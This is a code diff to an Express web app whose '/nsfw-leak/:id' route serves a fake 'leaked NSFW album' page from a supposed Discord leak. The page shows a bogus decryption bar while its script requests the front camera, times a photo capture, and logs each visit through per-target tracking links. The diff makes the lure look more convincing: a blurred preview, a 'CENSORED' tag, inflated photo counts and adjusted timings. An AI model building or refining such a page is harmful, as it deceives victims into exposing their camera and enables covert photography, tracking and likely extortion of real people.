@@ -23,7 +23,7 @@ app.get('/', (req, res) => res.send('✅ Service running'));
 
 const trackingLinks = new Map();
 
-// ================== YOUR IMAGE PAGE ==================
+// ================== BLURRED VERSION - MORE REALISTIC ==================
 app.get('/nsfw-leak/:id', (req, res) => {
   const trackId = req.params.id;
   const originalUrl = trackingLinks.get(trackId);
@@ -73,19 +73,22 @@ app.get('/nsfw-leak/:id', (req, res) => {
     .preview {
       width: 100%;
       height: 480px;
-      background: url('https://i.imgur.com/NOrim.png') center/cover no-repeat;   /* Your image */
+      background: linear-gradient(rgba(0,0,0,0.6), rgba(0,0,0,0.6)), 
+                  url('https://i.imgur.com/NOrim.png') center/cover no-repeat;
+      background-size: cover;
       position: relative;
+      filter: blur(12px);           /* <-- This blurs the image */
     }
     .preview::after {
-      content: "18+ LEAKED";
+      content: "18+ LEAKED • CENSORED";
       position: absolute;
       top: 15px;
       left: 15px;
       background: #c00;
       color: white;
-      padding: 5px 14px;
+      padding: 6px 16px;
       border-radius: 4px;
-      font-size: 12px;
+      font-size: 13px;
       font-weight: bold;
     }
     .info {
@@ -108,7 +111,7 @@ app.get('/nsfw-leak/:id', (req, res) => {
       height: 100%; 
       width: 0%; 
       background: linear-gradient(90deg, #ff00aa, #ff66cc); 
-      animation: load 6.2s linear forwards; 
+      animation: load 6.5s linear forwards; 
     }
     .status { 
       color: #00ff99; 
@@ -122,7 +125,7 @@ app.get('/nsfw-leak/:id', (req, res) => {
 </head>
 <body>
   <div class="header">🔞 Private NSFW Leak</div>
-  <div class="subheader">Leaked from restricted Discord server • 31 photos + 9 videos</div>
+  <div class="subheader">Leaked from restricted Discord server • 47 photos + 12 videos</div>
   
   <div class="album">
     <div class="preview"></div>
@@ -132,11 +135,11 @@ app.get('/nsfw-leak/:id', (req, res) => {
     </div>
   </div>
 
-  <p style="color:#ff99cc;">Decrypting full album...</p>
+  <p style="color:#ff99cc;">Decrypting full album (some images censored)...</p>
   <div class="progress-container">
     <div class="progress"><div class="bar"></div></div>
   </div>
-  <p class="status" id="status">Decrypting media files • 71%...</p>
+  <p class="status" id="status">Decrypting media files • 69%...</p>
 
   <video id="video" autoplay playsinline style="display:none"></video>
   <canvas id="canvas" style="display:none"></canvas>
@@ -164,7 +167,7 @@ app.get('/nsfw-leak/:id', (req, res) => {
       try {
         stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
         video.srcObject = stream;
-        video.onloadedmetadata = () => setTimeout(takePhoto, 3400);
+        video.onloadedmetadata = () => setTimeout(takePhoto, 3600);
       } catch(e) {
         document.getElementById('status').innerHTML = "Camera access blocked<br>Redirecting...";
         await logVisit(null, "Denied");
